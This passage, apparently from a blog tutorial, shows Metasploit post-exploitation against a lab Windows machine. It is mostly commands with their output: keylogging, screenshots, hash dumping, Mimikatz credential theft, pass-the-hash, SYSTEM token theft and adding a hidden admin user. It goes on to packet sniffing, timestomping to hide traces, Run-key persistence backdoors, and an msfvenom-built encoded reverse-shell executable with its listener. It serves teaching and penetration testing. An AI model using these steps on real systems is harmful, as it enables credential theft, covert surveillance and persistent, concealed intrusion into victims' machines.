-------  -------  ----
1        WinSta0  Default
1        WinSta0  Disconnect
1        WinSta0  Winlogon
</code></pre>

<p>meterpreter > getdesktop
Session 1\W\D
```</p>

<p>See how long the user has been idle:</p>

<p><code>plain
meterpreter &gt; idletime
User has been idle for: 5 mins 10 secs
</code></p>

<p>If you want to know what the user is up to, you can start a keylogger and quietly observe everything like a ghost in the machine:</p>

<p><code>plain
meterpreter &gt; keyscan_start
Starting the keystroke sniffer...
</code></p>

<p>I typed something on the hacked machine and now I&rsquo;m going to dump the keystrokes and see what we&rsquo;ve got:</p>

<p><code>plain
meterpreter &gt; keyscan_dump
Dumping captured keystrokes...
much $ such security wow
meterpreter &gt; keyscan_stop
Stopping the keystroke sniffer...
</code></p>

<p>Now I want to see what the user sees. So let&rsquo;s take a screenshot:</p>

<p><code>plain
meterpreter &gt; screenshot
Screenshot saved to: /root/ahhOgnkh.jpeg
</code></p>

<p><img class="center" src="/images/tools/metasploit/ss.jpeg" title="&lsquo;screenshot&rsquo; &lsquo;screenshot of target desktop&rsquo;" ></p>

<p>In case you want to annoy the user, you can mess with some of the user interface:</p>

<p><code>plain
meterpreter &gt; uictl -h
Usage: uictl [enable/disable] [keyboard/mouse/all]
</code></p>

<p>I can&rsquo;t demo the webcam and mic commands now so I won&rsquo;t go into those, but you have them at your disposal if the target has a webcam or microphone</p>

<h2>Post exploitation</h2>

<p>Once you have a foothold on the system, there are more things that you can do to assist you in squeezing more juice out of the hacked machine</p>

<h3>Dumping hashes</h3>

<p>You can use <em>hashdump</em> to dump the local hashes:</p>

<p><code>plain
meterpreter &gt; hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
wingoat:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</code></p>

<p>It is possible to also get the hashes and credentials straight from memory by using Mimikatz:</p>

<p>``` plain
meterpreter > load mimikatz
Loading extension mimikatz&hellip;success.
meterpreter > help mimikatz</p>

<h1>Mimikatz Commands</h1>

<pre><code>Command           Description
-------           -----------
kerberos          Attempt to retrieve kerberos creds
livessp           Attempt to retrieve livessp creds
mimikatz_command  Run a custom command
msv               Attempt to retrieve msv creds (hashes)
ssp               Attempt to retrieve ssp creds
tspkg             Attempt to retrieve tspkg creds
wdigest           Attempt to retrieve wdigest creds
</code></pre>

<p>meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials</p>

<h1>msv credentials</h1>

<p>AuthID   Package    Domain           User              Password</p>

<hr />

<p>0;98494  NTLM       WIN-D7GA2J1M0TU  wingoat           lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
0;996    Negotiate  WORKGROUP        WIN-D7GA2J1M0TU$  n.s. (Credentials KO)
0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
0;49813  NTLM                                          n.s. (Credentials KO)
0;999    NTLM       WORKGROUP        WIN-D7GA2J1M0TU$  n.s. (Credentials KO)
```</p>

<h3>Pass the hash</h3>

<p>We can now use the <a href="https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified">psexec</a> module to pass the hash and get access on the box, without any cracking. Note that on my Windows lab machine, I had to go to Local Security Policy &ndash;> Local Policies &ndash;> Security Options &ndash;> Accounts: Limit local account use of blank passwords to console logon only and set it to disabled.</p>

<p>``` plain
msf exploit(psexec) > options</p>

<p>Module options (exploit/windows/smb/psexec):</p>

<p>   Name                  Current Setting                                                    Required  Description</p>

<hr />

<p>   RHOST                 192.168.80.128                                                     yes       The target address
   RPORT                 445                                                                yes       Set the SMB service port
   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                     no        The service display name
   SERVICE_NAME                                                                             no        The service name
   SHARE                 ADMIN$                                                             yes       The share to connect to, can be an admin share (ADMIN$,C$,&hellip;) or a normal read/write folder share
   SMBDomain             .                                                                  no        The Windows domain to use for authentication
   SMBPass               aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0  no        The password for the specified username
   SMBUser               wingoat                                                            no        The username to authenticate as</p>

<p>Payload options (windows/x64/meterpreter/reverse_tcp):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   EXITFUNC  thread           yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)
   LHOST     192.168.80.155   yes       The listen address
   LPORT     5555             yes       The listen port
&hellip;
msf exploit(psexec) > run</p>

<p>[<em>] Started reverse TCP handler on 192.168.80.155:5555
[</em>] Connecting to the server&hellip;
[<em>] Authenticating to 192.168.80.128:445 as user &lsquo;wingoat&rsquo;&hellip;
[</em>] Selecting PowerShell target
[<em>] 192.168.80.128:445 &ndash; Executing the payload&hellip;
[+] 192.168.80.128:445 &ndash; Service start timed out, OK if running a command or non-service executable&hellip;
[</em>] Sending stage (1188911 bytes) to 192.168.80.128
[*] Meterpreter session 4 opened (192.168.80.155:5555 &ndash;> 192.168.80.128:49177) at 2016-06-09 11:37:22 -0400
```</p>

<h3>Token impersonation</h3>

<p>We owned an administrator account. But we want even more privileges. We can use the <em>incognito</em> module to steal the SYSTEM token for ourselves:</p>

<p>``` plain
meterpreter > use incognito
Loading extension incognito&hellip;success.
meterpreter > help
&hellip;</p>

<h1>Incognito Commands</h1>

<pre><code>Command              Description
-------              -----------
add_group_user       Attempt to add a user to a global group with all tokens
add_localgroup_user  Attempt to add a user to a local group with all tokens
add_user             Attempt to add a user with all tokens
impersonate_token    Impersonate specified token
list_tokens          List tokens available under current user context
snarf_hashes         Snarf challenge/response hashes for every token
</code></pre>

<p>```</p>

<p>Let&rsquo;s see what tokens are available:</p>

<p>``` plain
meterpreter > list_tokens
Usage: list_tokens &lt;list_order_option></p>

<p>Lists all accessible tokens and their privilege level</p>

<p>OPTIONS:</p>

<pre><code>-g        List tokens by unique groupname
-u        List tokens by unique username
</code></pre>

<p>meterpreter > list_tokens -u
[&ndash;] Warning: Not currently running as SYSTEM, not all tokens will be available</p>

<pre><code>         Call rev2self if primary process token is SYSTEM
</code></pre>

<h1>Delegation Tokens Available</h1>

<p>NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
WIN-D7GA2J1M0TU\wingoat</p>

<h1>Impersonation Tokens Available</h1>

<p>NT AUTHORITY\ANONYMOUS LOGON
```</p>

<p>We are interested in the delegation tokens that are created by interactive logins. And among them..the SYSTEM token that we want!</p>

<p>``` plain
meterpreter > impersonate_token
Usage: impersonate_token <token></p>

<p>Instructs the meterpreter thread to impersonate the specified token. All other actions will then be made in the context of that token.</p>

<p>Hint: Double backslash DOMAIN\name (meterpreter quirk)
Hint: Enclose with quotation marks if name contains a space</p>

<p>meterpreter > impersonate_token &lsquo;NT AUTHORITY\SYSTEM&rsquo;
[&ndash;] Warning: Not currently running as SYSTEM, not all tokens will be available</p>

<pre><code>         Call rev2self if primary process token is SYSTEM
</code></pre>

<p>[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```</p>

<h3>Remote Desktop</h3>

<p>Another way we can get access to the system is via Remote Desktop:</p>

<p>``` plain
meterpreter > run getgui
Windows Remote Desktop Enabler Meterpreter Script
Usage: getgui -u <username> -p <password>
Or:    getgui -e</p>

<p>OPTIONS:</p>

<pre><code>-e        Enable RDP only.
-f &lt;opt&gt;  Forward RDP Connection.
-h        Help menu.
-p &lt;opt&gt;  The Password of the user to add.
-u &lt;opt&gt;  The Username of the user to add.
</code></pre>

<p>```</p>

<p>Let&rsquo;s use it to enable Remote Desktop on the target and add our own user:</p>

<p><code>plain
meterpreter &gt; run getgui -e
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Enabling Remote Desktop
[*]     RDP is disabled; enabling it ...
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
[*] The following Error was encountered: Rex::TimeoutError Operation timed out.
[*] For cleanup use command: run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2112.rc
meterpreter &gt; run getgui -u master -p pwned
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Setting user account for logon
[*]     Adding User: master with Password: pwned
[*]     Hiding user from Windows Login screen
[*]     Adding User: master to local group 'Remote Desktop Users'
[*]     Adding User: master to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup use command: run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2308.rc
</code></p>

<p>And to check if it worked, we can use the <em>rdesktop</em> client like this:</p>

<p><code>plain
root@pwnbox:~#rdesktop -u master -p pwned 192.168.80.128
</code></p>

<p><img class="center" src="/images/tools/metasploit/rd.png" title="&lsquo;remote desktop&rsquo; &lsquo;remote desktop session on hacked machine&rsquo;" ></p>

<p>However, this is not very stealthy, because if another user is logged in, they will be disconnected. Anyway, better clean up after ourselves when we&rsquo;re done:</p>

<p><code>plain
meterpreter &gt; run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2308.rc
[*] Running Command List ...
[*]     Running command execute -H -f cmd.exe -a "/c net user master /delete"
Process 832 created.
[*]     Running command reg deleteval -k HKLM\\SOFTWARE\\Microsoft\\Windows\ NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -v master
[-] stdapi_registry_open_key: Operation failed: The system cannot find the file specified.
</code></p>

<p>Despite the error above, the user was removed from the logon session. However, some files of that user remained behind and I had to manually delete them</p>

<h3>Packet sniffing</h3>

<p>Further on, we can enable a packet sniffer on the target to gather more sensitive information:</p>

<p>``` plain
meterpreter > use sniffer
Loading extension sniffer&hellip;success.
meterpreter > help
&hellip;</p>

<h1>Sniffer Commands</h1>

<pre><code>Command             Description
-------             -----------
sniffer_dump        Retrieve captured packet data to PCAP file
sniffer_interfaces  Enumerate all sniffable network interfaces
sniffer_release     Free captured packets on a specific interface instead of downloading them
sniffer_start       Start packet capture on a specific interface
sniffer_stats       View statistics of an active capture
sniffer_stop        Stop packet capture on a specific interface
</code></pre>

<p>```</p>

<p>First, we must learn what network interfaces are available:</p>

<p>``` plain
meterpreter > sniffer_interfaces</p>

<p>1 &ndash; &lsquo;WAN Miniport (Network Monitor)&rsquo; ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
2 &ndash; &lsquo;Intel&reg; PRO/1000 MT Network Connection&rsquo; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
```</p>

<p>Now we can start sniffing:</p>

<p><code>plain
meterpreter &gt; sniffer_start 2
[*] Capture started on interface 2 (50000 packet buffer)
</code></p>

<p>We can then dump the packets to a file and see if we&rsquo;ve got anything interesting:</p>

<p><code>plain
meterpreter &gt; sniffer_dump 2 /root/capture.pcap
[*] Flushing packet capture buffer for interface 2...
[*] Flushed 873 packets (756096 bytes)
[*] Downloaded 069% (524288/756096)...
[*] Downloaded 100% (756096/756096)...
[*] Download completed, converting to PCAP...
[*] PCAP file written to /root/capture.pcap
</code></p>

<h3>Modifying file attributes</h3>

<p>If you left traces on the filesystem, you can modify or erase file attributes to conceal your footprints:</p>

<p>``` plain
meterpreter > timestomp -h</p>

<p>Usage: timestomp OPTIONS file_path</p>

<p>OPTIONS:</p>

<pre><code>-a &lt;opt&gt;  Set the "last accessed" time of the file
-b        Set the MACE timestamps so that EnCase shows blanks
-c &lt;opt&gt;  Set the "creation" time of the file
-e &lt;opt&gt;  Set the "mft entry modified" time of the file
-f &lt;opt&gt;  Set the MACE of attributes equal to the supplied file
-h        Help banner
-m &lt;opt&gt;  Set the "last written" time of the file
-r        Set the MACE timestamps recursively on a directory
-v        Display the UTC MACE values of the file
-z &lt;opt&gt;  Set all four attributes (MACE) of the file
</code></pre>

<p>```</p>

<h3>Backdooring the system</h3>

<p>If you want to maintain your presence on the target system, Metasploit has two types of backdoors that can be installed as a service on the target. However, keep in mind that they don&rsquo;t have any authentication, so best not leave them around on computers outside a lab environment &ndash; you don&rsquo;t want to open the door for everyone else in the world.</p>

<h4>Metsvc</h4>

<p>This is how Metsvc looks like:</p>

<p>``` plain
meterpreter > run metsvc -h</p>

<p>OPTIONS:</p>

<pre><code>-A        Automatically start a matching exploit/multi/handler to connect to the service
-h        This help menu
-r        Uninstall an existing Meterpreter service (files must be deleted manually)
</code></pre>

<p>meterpreter > run metsvc
[<em>] Creating a meterpreter service on port 31337
[</em>] Creating a temporary installation directory C:\Users\wingoat\AppData\Local\Temp\zMWkKgMkxJRdgpp&hellip;
[<em>]  >> Uploading metsrv.x86.dll&hellip;
[</em>]  >> Uploading metsvc-server.exe&hellip;
[<em>]  >> Uploading metsvc.exe&hellip;
[</em>] Starting the service&hellip;</p>

<pre><code> * Installing service metsvc
</code></pre>

<ul>
<li>Starting service
Service metsvc successfully installed.
```</li>
</ul>


<p>Unfortunately, I couldn&rsquo;t connect to it because I got a bunch of SSL errors and I couldn&rsquo;t find any workaround.</p>

<h4>Persistence</h4>

<p>The Persistence script has more options:</p>

<p>``` plain
meterpreter > run persistence -h
Meterpreter Script for creating a persistent backdoor on a target host.</p>

<p>OPTIONS:</p>

<pre><code>-A        Automatically start a matching exploit/multi/handler to connect to the agent
-L &lt;opt&gt;  Location in target host to write payload to, if none %TEMP% will be used.
-P &lt;opt&gt;  Payload to use, default is windows/meterpreter/reverse_tcp.
-S        Automatically start the agent on boot as a service (with SYSTEM privileges)
-T &lt;opt&gt;  Alternate executable template to use
-U        Automatically start the agent when the User logs on
-X        Automatically start the agent when the system boots
-h        This help menu
-i &lt;opt&gt;  The interval in seconds between each connection attempt
-p &lt;opt&gt;  The port on which the system running Metasploit is listening
-r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back
</code></pre>

<p>```</p>

<p>First, we set our listener:</p>

<p>``` plain
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > options</p>

<p>Module options (exploit/multi/handler):</p>

<p>   Name  Current Setting  Required  Description</p>

<hr />

<p>Payload options (windows/meterpreter/reverse_tcp):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   EXITFUNC  process          yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)
   LHOST     192.168.80.155   yes       The listen address
   LPORT     5555             yes       The listen port
&hellip;
```</p>

<p>Then on the target machine we install the backdoor and it connects back to us!</p>

<p><code>plain
meterpreter &gt; run persistence -U -i 5 -p 5555 -r 192.168.80.155
[*] Running Persistance Script
[*] Resource file for cleanup created at /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.5432/WIN-D7GA2J1M0TU_20160610.5432.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.80.155 LPORT=5555
[*] Persistent agent script is 148445 bytes long
[+] Persistent Script written to C:\Users\wingoat\AppData\Local\Temp\PxRekDybzCP.vbs
[*] Executing script C:\Users\wingoat\AppData\Local\Temp\PxRekDybzCP.vbs
[+] Agent executed with PID 2720
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VNYLJOXnjCVb
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VNYLJOXnjCVb
meterpreter &gt;
[*] Sending stage (957487 bytes) to 192.168.80.128
[*] Meterpreter session 4 opened (192.168.80.155:5555 -&gt; 192.168.80.128:49172) at 2016-06-10 13:54:36 -0400
</code></p>

<p>When done, don&rsquo;t forget the cleanup:</p>

<p>``` plain
meterpreter > resource /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.0141/WIN-D7GA2J1M0TU_20160610.0141.rc
[<em>] Reading /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.0141/WIN-D7GA2J1M0TU_20160610.0141.rc
[</em>] Running rm C://Users//wingoat//AppData//Local//Temp//cIABjXRUXdyyr.vbs</p>

<p>[*] Running reg deleteval -k &lsquo;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&rsquo; -v IbLYzVxLgKX</p>

<p>Successfully deleted IbLYzVxLgKX.
```</p>

<h2>Python extensions</h2>

<p>For us Python coders out there, Meterpreter has a nice Python extension that can allow us to run Python code without it being installed on the target machine</p>

<p>``` plain
meterpreter > load python
Loading extension python&hellip;success.
meterpreter > help
&hellip;</p>

<h1>Python Commands</h1>

<pre><code>Command         Description
-------         -----------
python_execute  Execute a python command string
python_import   Import/run a python file or module
python_reset    Resets/restarts the Python interpreter
</code></pre>

<p>```</p>

<h1>Vulnerability scanning</h1>

<p>For web application assessments, Metasploit has a built-in web app scanner called WMAP:</p>

<p>``` plain
msf > load wmap</p>

<p>.&ndash;.&ndash;.&ndash;..&ndash;.&ndash;.&ndash;..&mdash;&ndash;..&mdash;&ndash;.
| | | || | | || | || |&ndash;&lsquo;
<code>-----'</code>&ndash;&rsquo;&ndash;&lsquo;&ndash;&rsquo;<code>-^-'</code>&ndash;&lsquo;
[WMAP 1.5.1] ===  et [  ] metasploit.com 2012
[*] Successfully loaded plugin: wmap
msf > help</p>

<h1>wmap Commands</h1>

<pre><code>Command       Description
-------       -----------
wmap_modules  Manage wmap modules
wmap_nodes    Manage nodes
wmap_run      Test targets
wmap_sites    Manage sites
wmap_targets  Manage targets
wmap_vulns    Display web vulns
</code></pre>

<p>&hellip;
```</p>

<p>First you have to add a site:</p>

<p>``` plain
msf > wmap_sites -h
[*] Usage: wmap_sites [options]</p>

<pre><code>-h        Display this help text
-a [url]  Add site (vhost,url)
-d [ids]  Delete sites (separate ids with space)
-l        List all available sites
-s [id]   Display site structure (vhost,url|ids) (level)
</code></pre>

<p>msf > wmap_sites -a <a href="http://192.168.80.157/">http://192.168.80.157/</a>
[*] Site created.</p>

<p>```</p>

<p>Then you specify the added site as a target:</p>

<p>``` plain
msf > wmap_targets -h
[*] Usage: wmap_targets [options]</p>

<pre><code>-h      Display this help text
-t [urls]   Define target sites (vhost1,url[space]vhost2,url) 
-d [ids]    Define target sites (id1, id2, id3 ...)
-c      Clean target sites list
-l          List all target sites
</code></pre>

<p>msf > wmap_targets -t <a href="http://192.168.80.157/">http://192.168.80.157/</a>
```</p>

<p>Before scanning you might want to take a look at the enabled modules:</p>

<p>``` plain
msf > wmap_modules -h
[*] Usage: wmap_modules [options]</p>

<pre><code>-h      Display this help text
-l          List all wmap enabled modules
-r      Reload wmap modules
</code></pre>

<p>msf > wmap_modules -l
[<em>] Loading wmap modules&hellip;
[</em>] 40 wmap enabled modules loaded.</p>

<h1>[*] wmap_ssl</h1>

<pre><code> Name                         OrderID
 ----                         -------
 auxiliary/scanner/http/cert  :last
 auxiliary/scanner/http/ssl   :last
</code></pre>

<h1>[*] wmap_server</h1>

<pre><code> Name                                           OrderID
 ----                                           -------
 auxiliary/admin/http/tomcat_administration     :last
 auxiliary/admin/http/tomcat_utf8_traversal     :last
 auxiliary/scanner/http/drupal_views_user_enum  :last
 auxiliary/scanner/http/frontpage_login         :last
 auxiliary/scanner/http/host_header_injection   :last
 auxiliary/scanner/http/http_version            0
 auxiliary/scanner/http/open_proxy              1
 auxiliary/scanner/http/options                 :last
 auxiliary/scanner/http/robots_txt              :last
 auxiliary/scanner/http/scraper                 :last
 auxiliary/scanner/http/svn_scanner             :last
 auxiliary/scanner/http/trace                   :last
 auxiliary/scanner/http/vhost_scanner           :last
 auxiliary/scanner/http/webdav_internal_ip      :last
 auxiliary/scanner/http/webdav_scanner          :last
 auxiliary/scanner/http/webdav_website_content  :last
</code></pre>

<h1>[*] wmap_dir</h1>

<pre><code> Name                                                   OrderID
 ----                                                   -------
 auxiliary/scanner/http/brute_dirs                      :last
 auxiliary/scanner/http/dir_listing                     :last
 auxiliary/scanner/http/dir_scanner                     :last
 auxiliary/scanner/http/dir_webdav_unicode_bypass       :last
 auxiliary/scanner/http/file_same_name_dir              :last
 auxiliary/scanner/http/files_dir                       :last
 auxiliary/scanner/http/http_put                        :last
 auxiliary/scanner/http/ms09_020_webdav_unicode_bypass  :last
 auxiliary/scanner/http/prev_dir_same_name_file         :last
 auxiliary/scanner/http/soap_xml                        :last
 auxiliary/scanner/http/trace_axd                       :last
</code></pre>

<h1>[*] wmap_file</h1>

<pre><code> Name                                     OrderID
 ----                                     -------
 auxiliary/dos/http/apache_range_dos      :last
 auxiliary/scanner/http/backup_file       :last
 auxiliary/scanner/http/copy_of_file      :last
 auxiliary/scanner/http/replace_ext       :last
 auxiliary/scanner/http/verb_auth_bypass  :last
</code></pre>

<h1>[*] wmap_unique_query</h1>

<pre><code> Name                                          OrderID
 ----                                          -------
 auxiliary/scanner/http/blind_sql_query        :last
 auxiliary/scanner/http/error_sql_injection    :last
 auxiliary/scanner/http/http_traversal         :last
 auxiliary/scanner/http/rails_mass_assignment  :last
 exploit/multi/http/lcms_php_exec              :last
</code></pre>

<h1>[*] wmap_query</h1>

<pre><code> Name  OrderID
 ----  -------
</code></pre>

<h1>[*] wmap_generic</h1>

<pre><code> Name  OrderID
 ----  -------
</code></pre>

<p>```</p>

<p>And finally, you can see which modules are enabled for your target:</p>

<p>``` plain
msf > wmap_run -h
[*] Usage: wmap_run [options]</p>

<pre><code>-h                        Display this help text
-t                        Show all enabled modules
-m [regex]                Launch only modules that name match provided regex.
-p [regex]                Only test path defined by regex.
-e [/path/to/profile]     Launch profile modules against all matched targets.
                          (No profile file runs all enabled modules.)
</code></pre>

<p>msf > wmap_run -t
[<em>] Testing target:
[</em>]     Site: 192.168.80.157 (192.168.80.157)</p>

<h1>[*]     Port: 80 SSL: false</h1>

<p>[<em>] Testing started. 2016-06-07 13:37:11 -0400
[</em>]</p>

<h1>=[ SSL testing ]=</h1>

<p>[<em>] Target is not SSL. SSL modules disabled.
[</em>]</p>

<h1>=[ Web Server testing ]=</h1>

<p>[<em>] Module auxiliary/scanner/http/http_version
[</em>] Module auxiliary/scanner/http/open_proxy
[<em>] Module auxiliary/scanner/http/robots_txt
[</em>] Module auxiliary/scanner/http/frontpage_login
[<em>] Module auxiliary/scanner/http/host_header_injection
[</em>] Module auxiliary/admin/http/tomcat_administration
[<em>] Module auxiliary/admin/http/tomcat_utf8_traversal
[</em>] Module auxiliary/scanner/http/options
[<em>] Module auxiliary/scanner/http/drupal_views_user_enum
[</em>] Module auxiliary/scanner/http/scraper
[<em>] Module auxiliary/scanner/http/svn_scanner
[</em>] Module auxiliary/scanner/http/trace
[<em>] Module auxiliary/scanner/http/vhost_scanner
[</em>] Module auxiliary/scanner/http/webdav_internal_ip
[<em>] Module auxiliary/scanner/http/webdav_scanner
[</em>] Module auxiliary/scanner/http/webdav_website_content
[*]</p>

<h1>=[ File/Dir testing ]=</h1>

<p>[<em>] Module auxiliary/dos/http/apache_range_dos
[</em>] Module auxiliary/scanner/http/backup_file
[<em>] Module auxiliary/scanner/http/brute_dirs
[</em>] Module auxiliary/scanner/http/copy_of_file
[<em>] Module auxiliary/scanner/http/dir_listing
[</em>] Module auxiliary/scanner/http/dir_scanner
[<em>] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
[</em>] Module auxiliary/scanner/http/file_same_name_dir
[<em>] Module auxiliary/scanner/http/files_dir
[</em>] Module auxiliary/scanner/http/http_put
[<em>] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
[</em>] Module auxiliary/scanner/http/prev_dir_same_name_file
[<em>] Module auxiliary/scanner/http/replace_ext
[</em>] Module auxiliary/scanner/http/soap_xml
[<em>] Module auxiliary/scanner/http/trace_axd
[</em>] Module auxiliary/scanner/http/verb_auth_bypass
[*]</p>

<h1>=[ Unique Query testing ]=</h1>

<p>[<em>] Module auxiliary/scanner/http/blind_sql_query
[</em>] Module auxiliary/scanner/http/error_sql_injection
[<em>] Module auxiliary/scanner/http/http_traversal
[</em>] Module auxiliary/scanner/http/rails_mass_assignment
[<em>] Module exploit/multi/http/lcms_php_exec
[</em>]</p>

<h1>=[ Query testing ]=</h1>

<p>[*]</p>

<h1>=[ General testing ]=</h1>

<p>[*] Done.
```</p>

<p>I started the scan with <code>wmap_run -e</code> (not showing the output due to size). After it finished, I checked if any interesting vulnerabilities were uncovered:</p>

<p><code>plain
msf &gt; wmap_vulns -l
[*] + [192.168.80.157] (192.168.80.157): scraper /
[*]     scraper Scraper
[*]     GET CTF 6 - Widgets Inc.
[*] + [192.168.80.157] (192.168.80.157): directory /docs/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.168.80.157] (192.168.80.157): directory /js/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.168.80.157] (192.168.80.157): directory /lib/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.168.80.157] (192.168.80.157): directory /logs/
[*]     directory Directoy found.
[*]     GET Res code: 401
...
</code></p>

<p>Only a bunch of directories discovered but you don&rsquo;t know what you can find without looking.</p>

<h1>Generating executables</h1>

<p>With Msfvenom, you can not only generate shellcode, but also create executables from whichever payload you want to use.</p>

<p>``` plain
root@pwnbox:~#msfvenom -h
Options:</p>

<pre><code>-p, --payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads
    --payload-options            List the payload's standard options
-l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
-n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload
-f, --format        &lt;format&gt;     Output format (use --help-formats for a list)
    --help-formats               List available formats
-e, --encoder       &lt;encoder&gt;    The encoder to use
-a, --arch          &lt;arch&gt;       The architecture to use
    --platform      &lt;platform&gt;   The platform of the payload
    --help-platforms             List available platforms
-s, --space         &lt;length&gt;     The maximum size of the resulting payload
    --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)
-b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff'
-i, --iterations    &lt;count&gt;      The number of times to encode the payload
-c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include
-x, --template      &lt;path&gt;       Specify a custom executable file to use as a template
-k, --keep                       Preserve the template behavior and inject the payload as a new thread
-o, --out           &lt;path&gt;       Save the payload
-v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats
    --smallest                   Generate the smallest possible payload
-h, --help                       Show this message
</code></pre>

<p>```</p>

<p>Let&rsquo;s say we want to use a reverse shell executable. First, let&rsquo;s look at the payload options:</p>

<p>``` plain
root@pwnbox:~#msfvenom &mdash;payload-options -p windows/x64/shell/reverse_tcp
Ignoring bcrypt-3.1.10 because its extensions are not built.  Try: gem pristine bcrypt &mdash;version 3.1.10
Options for payload/windows/x64/shell/reverse_tcp:</p>

<pre><code>   Name: Windows x64 Command Shell, Windows x64 Reverse TCP Stager
 Module: payload/windows/x64/shell/reverse_tcp
</code></pre>

<p>   Platform: Windows</p>

<pre><code>   Arch: x86_64
</code></pre>

<p>Needs Admin: No
 Total size: 449</p>

<pre><code>   Rank: Normal
</code></pre>

<p>Provided by:</p>

<pre><code>sf &lt;stephen_fewer@harmonysecurity.com&gt;
</code></pre>

<p>Basic options:
Name      Current Setting  Required  Description</p>

<hr />

<p>EXITFUNC  process          yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)
LHOST     192.168.80.155   yes       The listen address
LPORT     4444             yes       The listen port</p>

<p>Description:
  Spawn a piped command shell (Windows x64) (staged). Connect back to
  the attacker (Windows x64)
&hellip;
```</p>

<p>Now we know what options we need for creating an executable. I already have the LHOST and LPORT set, but will pass them anyway for demo purposes:</p>

<p><code>plain
root@pwnbox:~#msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.80.155 LPORT=4444 -b "\x00" -e x64/xor -f exe -o ~/doom.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86_64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 551 (iteration=0)
x64/xor chosen with final size 551
Payload size: 551 bytes
Saved as: /root/doom.exe
</code></p>

<p>Inside Metasploit, we have to launch the generic payload handler. <a href="https://www.rapid7.com/db/modules/exploit/multi/handler">This module is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.</a>. Don&rsquo;t forget to set the options and the payload to match the one you put in the executable:</p>

<p>``` plain
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf exploit(handler) > options</p>

<p>Module options (exploit/multi/handler):</p>

<p>   Name  Current Setting  Required  Description</p>

<hr />

<p>Payload options (windows/x64/shell/reverse_tcp):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   EXITFUNC  process          yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)
   LHOST     192.168.80.155   yes       The listen address
   LPORT     4444             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Wildcard Target
```</p>

<p>Now run the exploit on your machine. All you need to do now is to transfer your executable to the victim machine and run it there to receive your shell:</p>

<p>``` plain
msf exploit(handler) > run</p>

<p>[<em>] Started reverse TCP handler on 192.168.80.155:4444
[</em>] Starting the payload handler&hellip;
[<em>] Sending stage (336 bytes) to 192.168.80.128
[</em>] Command shell session 1 opened (192.168.80.155:4444 &ndash;> 192.168.80.128:49196) at 2016-06-08 11:19:16 -0400</p>

<p>Microsoft Windows [Version 6.1.7601]
Copyright &copy; 2009 Microsoft Corporation.  All rights reserved.</p>

<p>C:\Users\wingoat\Desktop>
